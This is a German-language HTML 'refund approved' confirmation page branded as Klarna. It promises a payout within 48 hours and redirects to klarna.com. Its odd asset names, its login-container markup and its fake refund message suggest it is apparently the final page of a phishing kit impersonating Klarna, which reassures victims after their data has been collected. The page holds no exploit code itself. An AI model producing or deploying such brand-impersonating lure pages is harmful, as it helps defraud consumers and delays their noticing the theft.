<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klarna</title>
    <link rel="stylesheet" href="./css/bavoka.css">
    <style>
        .hero-success-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            display: block;
            color: #007ac1;
            /* Klarna Blue */
            animation: popIn 0.5s ease-out;
        }

        @keyframes popIn {
            0% {
                transform: scale(0);
                opacity: 0;
            }

            80% {
                transform: scale(1.1);
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="login-container" style="display: flex; align-items: center; justify-content: center; height: 100vh;">
        <div class="form1" style="text-align: center; width: 100%; max-width: 400px;">
            <div style="margin-top: 20%;">
                <!-- Success Icon -->
                <svg class="hero-success-icon" viewBox="0 0 24 24" fill="none" stroke="#25b21e" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <path d="M9 12l2 2 4-4"></path>
                </svg>

                <h1 style="font-size: 24px; margin-bottom: 16px;">Vielen Dank!</h1>
                <p style="font-size: 16px; color: #171717; line-height: 1.5; margin-bottom: 32px;">
                    Deine Rückerstattung wurde genehmigt.<br>
                    Das Geld wird innerhalb von <strong>48 Stunden</strong> auf dein Konto überwiesen.
                </p>

                <div class="bottom-spacer">
                    <button onclick="window.location.href='https://www.klarna.com/de/'" class="submit-btn" style="margin-bottom: 16px;">Fenster
                        schließen</button>
                    
                </div>
            </div>

            <div class="hodpa" style="margin: 40px auto 0;">
                <img src="./img/huodop.PNG" alt="">
            </div>
        </div>
    </div>
</body>

</html>